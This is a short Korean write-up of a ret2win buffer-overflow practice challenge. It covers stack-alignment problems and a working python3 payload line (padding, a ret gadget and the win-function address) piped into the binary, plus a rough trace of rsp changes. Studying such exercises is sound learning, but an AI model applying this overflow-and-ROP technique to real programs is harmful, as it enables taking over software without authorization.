Writeup

2가지 사실 때문에 어려웠던 문제.

print가 개행문자를 추가하고 null문자 추가 때문에 2바이트 늘어나버려서 segmentation  fault가 떴었던 문제.
16바이트 rsp레지스터 맞춰야 system함수가 돌아가는 것을 몰랐던 문제

print해결방법은
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*40 + b"\xe7\x06\x40\x00\x00\x00\x00\x00" + b"\x56\x07\x40\x00\x00\x00\x00\x00")' | ./ret2win
이렇게 import sys; sys.stdut.buffer.write함수를 이용해, 페이로드 전달하는 것.

16바이트 rsp레지스터 맞추기 위해 ret하는 주소에 ret가넷을 찾아 넣으면 다음 문장을 읽었을 때 pop rip가 되어 ret로 jump를 하게 되어 다시금 ret을 실행하여 pop rip가 된 후 ret2win함수로
jump할 수 있게 되는 것이다.
8배수를 16배수로 맞춰준다는것이 핵심.

rsp추적하면
push %rbp	8바이트 감소	스택에 값을 푸시하면서 rsp 감소

sub $0x20, %rsp	16바이트 감소 (32바이트)	스택에 공간을 확보 (16바이트 정렬 유지)

mov %rsp, %rbp	변화 없음	rsp 값을 rbp로 복사, rsp는 그대로

pop %rbp	8바이트 증가	스택에서 값을 꺼내면서 rsp 증가

leaveq	rsp 복원, 8바이트 증가	스택 정리: rsp 복원, rbp 복구

retq	8바이트 증가	리턴 주소로 점프, rsp 증가

이런 구조. 따라서 rsp가 8배수였다는 것임..

결국은 ret가넷도 찾아서 넣어준다면 해결됨.
